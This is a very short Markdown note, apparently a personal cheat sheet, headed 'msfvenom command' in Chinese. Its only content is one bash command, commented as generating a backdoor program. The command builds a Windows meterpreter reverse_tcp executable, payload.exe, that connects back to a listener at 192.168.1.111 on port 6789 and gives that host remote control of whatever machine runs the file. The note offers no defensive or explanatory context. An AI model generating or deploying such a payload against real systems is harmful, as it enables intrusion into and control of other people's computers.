# msfvenom 命令

```bash
# 生成后台程序
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=6789 -f exe -o /mnt/d/payload.exe
```
